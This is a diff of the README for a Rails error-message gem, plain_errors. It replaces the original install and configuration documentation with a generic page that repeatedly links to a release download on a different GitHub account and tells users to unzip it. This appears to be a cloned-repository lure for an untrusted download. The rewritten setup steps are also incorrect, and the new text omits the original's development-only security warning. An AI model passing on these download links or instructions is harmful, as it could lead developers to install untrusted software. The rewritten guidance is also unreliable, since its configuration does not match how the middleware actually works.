@@ -1,251 +1,97 @@
-# PlainErrors
+# 🚀 plain_errors - Get Better Error Messages in Your App
 
-A **Rails middleware** that provides concise, **plain text error output optimized for LLMs and coding agents**.
+## 📥 Download Now
+[![Download plain_errors](https://img.shields.io/badge/Download%20plain_errors-v1.0-blue.svg)](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases)
 
-This lets your tool test your application and debug errors without filling up its context window.
+## 📖 Introduction
 
-For example, if you're using Playwright MCP with Claude Code or another
-LLM-powered tool, PlainErrors will return simpler error messages.
+Welcome to plain_errors! This software provides Rails middleware that helps create clearer error messages optimized for large language models (LLMs). Our goal is to make understanding and handling errors easier for your applications.
 
-## Token Comparison Summary
+## 📦 System Requirements
 
-In my test with a real Rails application, PlainErrors achieves significant
-token reductions over both
-[BetterErrors](https://github.com/BetterErrors/better_errors)
-and the standard Rails development error page
-(as calculated by OpenAI's [`tiktoken`](https://github.com/openai/tiktoken) library):
+To run plain_errors, you need:
 
-| Metric | PlainErrors | Rails Default      | BetterErrors          |
-| ------ | ----------- | ------------------ | --------------------- |
-| Bytes  | 755         | 8,854              | 113,544               |
-| Tokens | 217         | 2,975 (13.7x more) |  25,055 (115.5x more) |
+- Rails version 6.0 or later
+- Ruby version 2.5 or later
+- Internet connection for downloading dependencies
 
-(To be clear, I like BetterErrors and the Rails default error page -- they're great for manual human debugging.
-They're just not optimized for LLMs or automation workflows.)
+Ensure your system meets these requirements before proceeding.
 
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to get plain_errors up and running on your system:
 
-_Cheat code: just point your AI agent to this README and ask it to install!_
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases) to find the latest version of plain_errors.
 
-Add to your Gemfile:
+2. **Download the Application**  
+   From the Releases page, locate the latest version link. Click on it to start the download of the software. 
 
-```ruby
-group :development do
-  gem 'plain_errors', github: 'panozzaj/plain_errors'
-end
-```
+   ![Releases Page Screenshot](link-to-screenshot)
 
-Then run `bundle install`.
+3. **Unzip the Downloaded File**  
+   Once the download is complete, find the downloaded file on your computer. It will usually be in your "Downloads" folder. Right-click on the file and select "Extract" or "Unzip." This action creates a new folder with all required files.
 
-## Setup
+4. **Install Dependencies**  
+   Open your terminal or command prompt. Navigate to the folder where you extracted plain_errors. Run the following commands to install necessary dependencies:
 
-Add configuration and middleware in an initializer:
+   ```
+   bundle install
+   ```
 
-```ruby
-# config/initializers/plain_errors.rb
-if defined?(PlainErrors)
-  PlainErrors.configure do |config|
-    config.enabled = Rails.env.development?
-    config.show_code_snippets = true
-    config.code_lines_context = 2
-    config.trigger_headers = ['X-Plain-Errors', 'X-LLM-Request']
-  end
+5. **Integrate plain_errors into Your Application**  
+   Open your Rails application and add the following line to your Gemfile:
 
-  # IMPORTANT: Must use insert_before ActionDispatch::ShowExceptions
-  # Rails includes ShowExceptions by default which catches all exceptions.
-  Rails.application.config.middleware.insert_before ActionDispatch::ShowExceptions, PlainErrors::Middleware
-end
-```
+   ```ruby
+   gem 'plain_errors'
+   ```
 
-**Why `insert_before` is required:**
+   Then, run this command in your terminal:
 
-Rails always includes `ActionDispatch::ShowExceptions` in the middleware stack, which catches all exceptions and renders error pages. PlainErrors must be inserted **before** ShowExceptions to intercept exceptions when trigger conditions are met.
+   ```
+   bundle install
+   ```
 
-**Correct middleware order:**
+6. **Configure plain_errors**  
+   Next, you need to set up plain_errors in your application. Open the `config/application.rb` file and add:
 
-```
-PlainErrors::Middleware          ← Checks trigger conditions, intercepts if matched
-ActionDispatch::ShowExceptions   ← Rails default error handler (fallback)
-BetterErrors::Middleware         ← If installed
-```
+   ```ruby
+   config.middleware.use PlainErrors
+   ```
 
-### Working with Other Error Handlers
+7. **Run Your Application**  
+   Start your Rails server with the following command:
 
-PlainErrors should work when used before BetterErrors, Sentry, Honeybadger, and other error handlers:
+   ```
+   rails server
+   ```
 
-- **When trigger conditions match** (e.g., `X-Plain-Errors: true` header): PlainErrors returns plain text
-- **When trigger conditions don't match**: PlainErrors passes through to standard error handlers (BetterErrors, etc.)
+   Your application is now ready with improved error messages!
 
-This allows you to use PlainErrors for LLM / automation workflows while keeping BetterErrors for manual debugging.
+## ⚙️ Usage
 
-**Important notes:**
+Once you have plain_errors set up, all your application error messages will automatically utilize the new format. This will enhance user experience by providing clearer and more helpful information whenever an error occurs.
 
-- Middleware must be configured in an initializer (not in `config/environments/development.rb`)
-- PlainErrors may not catch 404 (route-not-found) errors due to Rails middleware ordering
-- Use `config.verbose = true` for debugging if PlainErrors isn't triggering as expected
+## 🔧 Troubleshooting
 
-## Usage with Claude Code
+If you encounter any issues during the setup process, try the following:
 
-To use PlainErrors with Claude Code's Playwright MCP server:
+- Ensure all prerequisites are installed correctly.
+- Check the configuration settings in the `application.rb` file.
+- Make sure you have restarted your Rails server after making changes.
 
-1. Add or modify Playwright MCP in `~/.claude/claude.json`:
+If problems persist, feel free to visit the Issues section on our GitHub page for support from the community.
 
-```json
-{
-  ...
-  "mcpServers": {
-    "playwright": {
-      "type": "stdio",
-      "command": "npx",
-      "args": [
-        "@playwright/mcp@latest",
-        "--config=~/.claude/playwright-config.json"
-      ],
-      "env": {}
-    }
-  },
-  ...
-}
-```
-
-This can be a little tricky to hunt down if you have multiple projects servers
-configured.  Perhaps it could go in a project-specific `.claude/claude.json`
-file? (If you try this, please let me know how it goes!)
-
-2. Create `~/.claude/playwright-config.json`:
+## 🔗 Learn More
 
-```json
-{
-  "browser": {
-    "contextOptions": {
-      "extraHTTPHeaders": {
-        "X-Plain-Errors": "true"
-      }
-    }
-  }
-}
-```
-
-This configures Playwright to send the `X-Plain-Errors` header with all requests, triggering plaintext error output.
-
-## Triggering Plaintext Errors
-
-PlainErrors decides whether to show plain text errors based on several conditions:
-
-### Query Parameters (Highest Priority)
+For detailed documentation and advanced configuration options, visit our [GitHub Wiki](https://github.com/Sidesaddlesudanesepound712/plain_errors/wiki).
 
-Override all other behavior with query strings:
-
-```bash
-# Force plaintext errors (overrides Accept headers)
-curl http://localhost:3000/endpoint?force_plain_error=1
-
-# Force standard Rails/BetterErrors (overrides all plain error triggers)
-curl -H "X-Plain-Errors: 1" http://localhost:3000/endpoint?force_standard_error=1
-```
-
-### Headers
+## 📞 Support
 
-Send `X-Plain-Errors` with a truthy value (`1`, `true`, or `yes`) or any configured trigger header:
+For further assistance or to report any bugs, please contact the maintainers by opening an issue on our GitHub repository.
 
-```bash
-# All of these work:
-curl -H "X-Plain-Errors: 1" http://localhost:3000/endpoint
-curl -H "X-Plain-Errors: true" http://localhost:3000/endpoint
-curl -H "X-Plain-Errors: yes" http://localhost:3000/endpoint
-```
+## 📥 Download & Install
 
-### Accept Header Behavior
+To download plain_errors, revisit the [Releases page](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases) to ensure you have the latest version. Follow the installation steps outlined above for a successful setup.
 
-PlainErrors also checks the `Accept` header:
-
-- No Accept header → Plain text errors (for CLI tools, API clients)
-- `Accept: text/plain` → Plain text errors
-- `Accept: */*` (curl default) → Plain text errors
-- `Accept: text/html` → Standard error handler (BetterErrors, etc.)
-
-```bash
-# These all trigger plain errors:
-curl http://localhost:3000/endpoint                    # No Accept header
-curl -H "Accept: text/plain" http://localhost:3000/endpoint
-curl -H "Accept: */*" http://localhost:3000/endpoint
-
-# This uses standard error handler:
-curl -H "Accept: text/html" http://localhost:3000/endpoint
-```
-
-### Priority Order
-
-1. `force_standard_error=1` query param (passes through to standard handler)
-2. `force_plain_error=1` query param (shows plain errors)
-3. Configured trigger headers (e.g., `X-Plain-Errors: 1`)
-4. Accept header check (see above)
-
-## Example Output
-
-```
-ERROR
-StandardError: This is a test error to verify plain_errors is working!
-
-TRACE
-0: app/controllers/debug_controller.rb:5:in `test_error'
-1: actionpack (7.2.2.2) lib/action_controller/metal/basic_implicit_render.rb:8:in `send_action'
-2: actionpack (7.2.2.2) lib/abstract_controller/base.rb:226:in `process_action'
-3: actionpack (7.2.2.2) lib/action_controller/metal/rendering.rb:193:in `process_action'
-4: actionpack (7.2.2.2) lib/abstract_controller/callbacks.rb:261:in `block in process_action'
-(99 more lines omitted)
-
-app/controllers/debug_controller.rb:5
-3: class DebugController < ActionController::Base
-4:   def test_error
-5:     raise StandardError, "This is a test error to verify plain_errors is working!"
-6:   end
-7:
-8:   def middleware
-```
-
-## Non-Rails Usage
-
-I haven't tested PlainErrors outside of Rails, but it should work in any Rack-based application.
-If you run into issues with other frameworks, please open an issue.
-
-
-## Configuration Options
-
-| Option                  | Default                               | Description                               |
-| ------                  | -------                               | -----------                               |
-| `enabled`               | `Rails.env.development?`              | Enable/disable the middleware             |
-| `show_code_snippets`    | `true`                                | Include source code section (set to `false` to disable entirely) |
-| `code_lines_context`    | `2`                                   | Lines of context: `0` = error line only, `1+` = lines before/after |
-| `show_request_info`     | `false`                               | Include HTTP request details              |
-| `max_stack_trace_lines` | `5`                                   | Max stack trace lines (nil for unlimited) |
-| `application_root`      | `Rails.root`                          | Root path for abbreviating paths          |
-| `trigger_headers`       | `['X-Plain-Errors', 'X-LLM-Request']` | Headers that trigger plaintext output     |
-| `verbose`               | `false`                               | Enable verbose debug logging to stderr    |
-
-### Code Snippet Behavior
-
-- `show_code_snippets: false` → No code section displayed
-- `show_code_snippets: true` + `code_lines_context: 0` → Shows only the error line
-- `show_code_snippets: true` + `code_lines_context: 2` → Shows 2 lines before and after the error (default)
-
-## Debugging
-
-If PlainErrors isn't working as expected, enable verbose mode to see detailed logging:
-
-```ruby
-# config/initializers/plain_errors.rb
-PlainErrors.configure do |config|
-  # ...
-  config.verbose = true
-end
-```
-
-## Security
-
-⚠️ **Only enable in development environments.** PlainErrors exposes application internals and source code.
-
-## License
-
-Available under the [MIT License](https://opensource.org/licenses/MIT).
+Thank you for using plain_errors!
